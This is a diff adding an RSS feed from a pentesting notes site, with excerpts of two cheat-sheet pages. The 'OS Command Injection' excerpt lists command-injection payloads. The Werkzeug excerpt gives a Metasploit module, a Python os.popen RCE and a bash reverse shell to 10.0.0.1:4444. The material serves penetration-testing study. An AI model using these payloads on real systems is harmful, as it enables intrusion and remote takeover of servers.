@@ -1,0 +1,26 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Remote Code Execution on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/tags/remote-code-execution/</link>
+    <description>Recent content in Remote Code Execution on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Sat, 11 Nov 2023 00:00:00 +0000</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/tags/remote-code-execution/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>OS Command Injection</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/os-command-injection/</link>
+      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/os-command-injection/</guid>
+      <description>Basic Payloads linkIf the payload includes whitespaces (&amp;rsquo; &amp;lsquo;), we need to change it to &amp;rsquo;+&amp;rsquo; or URL encoding (&amp;rsquo;%20&amp;rsquo;).&#xA;/api/cmd/whoami /command/whoami /?cmd=whoami /?cmd=;id /?cmd=ls /?cmd=ls .. /?cmd=ls ../ /?cmd=ls /home /?cmd=`ping -c 1 10.0.0.1` /?file=example.txt; echo $(ls -al /) /?file=example.txt; echo $(ls -al /) | &amp;lt;!-- PHP query string --&amp;gt; /?q=;system($_GET[cmd])&amp;amp;cmd=whoami /?q=${system($_GET[cmd])}&amp;amp;cmd=whoami /?productId=1&amp;amp;stockId=1|whoami /?productId=1&amp;amp;stockId=1|id &amp;lt;!-- Windows --&amp;gt; /?file=example.txt | systeminfo # /?file=example.txt ; systeminfo # /?file=example.txt&amp;#39;) ; systeminfo # URL Encoding linkWe may be able to bypass specific character filter by encoding them.</description>
+    </item>
+    <item>
+      <title>Werkzeug Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/framework/python/werkzeug-pentesting/</link>
+      <pubDate>Mon, 02 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/framework/python/werkzeug-pentesting/</guid>
+      <description>SSTI linkPlease see Flask Jinja2 SSTI&#xA;Remote Code Execution (RCE) in Console linkMetasploit link msfconsole msf&amp;gt; use exploit/multi/http/werkzeug_debug_rce Manual Exploitation linkIf we can access to /console page, we may be able to execute RCE.&#xA;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;whoami&amp;#39;).read(); import os; print(os.popen(&amp;#34;whoami&amp;#34;).read()) # Reverse shell __import__(&amp;#39;os&amp;#39;).popen(&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;).read() Console PIN Exploit linkReference: https://www.daehee.com/werkzeug-console-pin-exploit/&#xA;If the website is locked by PIN code in the /console page, you need to unlock it.</description>
+    </item>
+  </channel>
+</rss>
